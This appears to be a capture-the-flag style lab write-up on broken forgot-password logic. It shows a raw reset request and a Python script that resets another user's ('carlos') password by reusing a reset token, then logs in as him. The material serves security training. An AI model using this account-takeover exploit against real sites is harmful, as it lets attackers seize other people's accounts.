## Broken forgot password logic

*In the lab we have a forgot password logic where it compares the token in the url link from the email to the token used in the params and if correct then it changes the password* :

Here is the REQ:
```
POST /forgot-password?temp-forgot-password-token=5ou0ptm8yxv79042vazsc2h1jlrqhi3e HTTP/2
Host: 0aa700930308285382c8d42000550089.web-security-academy.net
Cookie: session=xFYBB716ntdZND3UiX6KeJWqcLGQdZjf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa700930308285382c8d42000550089.web-security-academy.net/forgot-password?temp-forgot-password-token=5ou0ptm8yxv79042vazsc2h1jlrqhi3e
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
Origin: https://0aa700930308285382c8d42000550089.web-security-academy.net
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

temp-forgot-password-token=5ou0ptm8yxv79042vazsc2h1jlrqhi3e&username=carlos&new-password-1=password&new-password-2=password
```

### Asimple python script can be used for the same 
``` python
import requests
import re
import sys
import urllib3

# Disable the warning in urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', "https": "http://127.0.0.1:8080"}

def normalize_url(url: str) -> str:
    # ensure URL has a scheme and no trailing slash
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip('/')

def access_target_account(s,url):
   # Forgot password URL
    forgot_password_url = f"{url}//forgot-password?temp-forgot-password-token=5ou0ptm8yxv79042vazsc2h1jlrqhi3e"
    password_reset_data = {"temp-forgot-password-token": "5ou0ptm8yxv79042vazsc2h1jlrqhi3e", "username": "carlos", "new-password-1": "password", "new-password-2": "password"}

    # Perform the request to reset the password
    print(f"[-] Attempting to reset password for carlos at {forgot_password_url}")
    r = s.post(forgot_password_url, data=password_reset_data, verify=False, allow_redirects=True)
    print(f"[-] POST {forgot_password_url} status: {r.status_code}")
    # print a short preview of response to help debugging
    preview = r.text[:800]
    print(preview)
    print()

    #Test login with new password
    login_url = f"{url}/login"
    login_data = {"username": "carlos", "password": "password"}
    print(f"[-] Attempting to login to {login_url} with username 'carlos' and new password 'password'")
    r2 = s.post(login_url, data=login_data, verify=False, allow_redirects=True)
    print(f"[-] POST {login_url} status: {r2.status_code}")
    # print a short preview of response to help debugging
    preview2 = r2.text[:800]
    print(preview2)
    print()

    if ("Your username is: carlos" in r2.text.lower() or "log out" in r2.text):
        print("[+] Successfully logged in as carlos after resetting password")
    else:
        print("[-] Failed to login as carlos after resetting password")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)
    
    s = requests.session()
    s.proxies = proxies
    url = normalize_url(sys.argv[1])
    access_target_account(s, url)


if __name__ == "__main__":
    main()
    
```